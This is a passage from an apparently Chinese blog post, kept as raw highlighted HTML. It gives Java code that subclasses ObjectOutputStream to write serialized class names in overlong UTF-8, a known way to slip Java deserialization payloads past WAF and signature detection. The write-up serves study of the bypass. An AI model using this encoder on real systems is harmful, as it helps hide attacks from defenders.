class="hljs-number">0xc1</span>, <span class="hljs-number">0x99</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9a</span>&#125;);<br><br><br>        bytesMap.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0xbb</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x81</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x82</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x83</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x84</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x85</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x86</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x87</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x88</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x89</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;J&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8c</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8e</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x8f</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x90</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x91</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x92</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x93</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x94</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x95</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x96</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x97</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x98</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x99</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9a</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9b</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x9d</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xa9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;j&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaa</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xab</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;l&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xac</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xad</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xae</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xaf</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb0</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb1</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb2</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb3</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;t&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb4</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb5</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb6</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb7</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb8</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;y&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xb9</span>&#125;);<br>        bytesMap.put(<span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xe0</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0xba</span>&#125;);<br><br>    &#125;<br><br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWritTwoBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//将name进行overlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = map.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">2</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">charWriteThreeBytes</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-comment">//将name进行overlong Encoding</span><br>        <span class="hljs-type">byte</span>[] bytes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[name.length() * <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;<br>        StringBuffer str=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; name.length(); i++) &#123;<br>            <span class="hljs-type">int</span>[] bs = bytesMap.get(name.charAt(i));<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">0</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">1</span>];<br>            bytes[k++]= (<span class="hljs-type">byte</span>) bs[<span class="hljs-number">2</span>];<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">0</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">1</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>            str.append(Integer.toHexString(bs[<span class="hljs-number">2</span>])+<span class="hljs-string">&quot;,&quot;</span>);<br>        &#125;<br>        System.out.println(str.toString());<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeShort(name.length() * <span class="hljs-number">3</span>);<br>            write(bytes);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeClassDescriptor</span><span class="hljs-params">(ObjectStreamClass desc)</span><br>            <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> desc.getName();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">externalizable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;externalizable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">serializable</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;serializable&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWriteObjectData</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;hasWriteObjectData&quot;</span>);<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isEnum</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>) getFieldValue(desc, <span class="hljs-string">&quot;isEnum&quot;</span>);<br>        ObjectStreamField[] fields = (ObjectStreamField[]) getFieldValue(desc, <span class="hljs-string">&quot;fields&quot;</span>);<br>        System.out.println(name);<br>        <span class="hljs-comment">//写入name（jdk原生写入方法）</span><br><span class="hljs-comment">//        writeUTF(name);</span><br>        <span class="hljs-comment">//写入name(两个字节表示一个字符)</span><br><span class="hljs-comment">//        charWritTwoBytes(name);</span><br>        <span class="hljs-comment">//写入name(三个字节表示一个字符)</span><br>        charWriteThreeBytes(name);<br><br><br>        writeLong(desc.getSerialVersionUID());<br>        <span class="hljs-type">byte</span> <span class="hljs-variable">flags</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (externalizable) &#123;<br>            flags |= ObjectStreamConstants.SC_EXTERNALIZABLE;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">protocolField</span> <span class="hljs-operator">=</span><br>                    <span class="hljs-literal">null</span>;<br>            <span class="hljs-type">int</span> protocol;<br>            <span class="hljs-keyword">try</span> &#123;<br>                protocolField = ObjectOutputStream.class.getDeclaredField(<span class="hljs-string">&quot;protocol&quot;</span>);<br>                protocolField.setAccessible(<span class="hljs-literal">true</span>);<br>                protocol = (<span class="hljs-type">int</span>) protocolField.get(<span class="hljs-built_in">this</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (protocol != ObjectStreamConstants.PROTOCOL_VERSION_1) &#123;<br>                flags |= ObjectStreamConstants.SC_BLOCK_DATA;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (serializable) &#123;<br>            flags |= ObjectStreamConstants.SC_SERIALIZABLE;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (hasWriteObjectData) &#123;<br>            flags |= ObjectStreamConstants.SC_WRITE_METHOD;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (isEnum) &#123;<br>            flags |= ObjectStreamConstants.SC_ENUM;<br>        &#125;<br>        writeByte(flags);<br><br>        writeShort(fields.length);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; fields.length; i++) &#123;<br>            <span class="hljs-type">ObjectStreamField</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> fields[i];<br>            writeByte(f.getTypeCode());<br>            writeUTF(f.getName());<br>            <span class="hljs-keyword">if</span> (!f.isPrimitive()) &#123;<br>                invoke(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;writeTypeString&quot;</span>, f.getTypeString());<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(Object object, String methodName, Object... args)</span> &#123;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">writeTypeString</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            writeTypeString = ObjectOutputStream.class.getDeclaredMethod(methodName, String.class);<br>            writeTypeString.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">try</span> &#123;<br>                writeTypeString.invoke(object, args);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getFieldValue</span><span class="hljs-params">(Object object, String fieldName)</span> &#123;<br>        Class&lt;?&gt; clazz = object.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            field = clazz.getDeclaredField(fieldName);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            value = field.get(object);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>文章评论区还提到了，可以直接重写writeUTF方法会更加简单，修改一下变成这样</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UTF8OutputStream</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ObjectOutputStream</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">(OutputStream out)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-built_in">super</span>(out);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">UTF8OutputStream</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, SecurityException &#123;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HashMap&lt;Character, <span class="hljs-type">int</span>[]&gt; map;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Map&lt;Character,<span class="hljs-type">int</span>[]&gt; bytesMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xae</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;;&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xbb</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc0</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;[&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9b</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;]&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0x9d</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa1</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa2</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa3</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa4</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa5</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa6</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, <span class="hljs-number">0xa7</span>&#125;);<br>        map.put(<span class="hljs-string">&#x27;h&#x27;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">0xc1</span>, 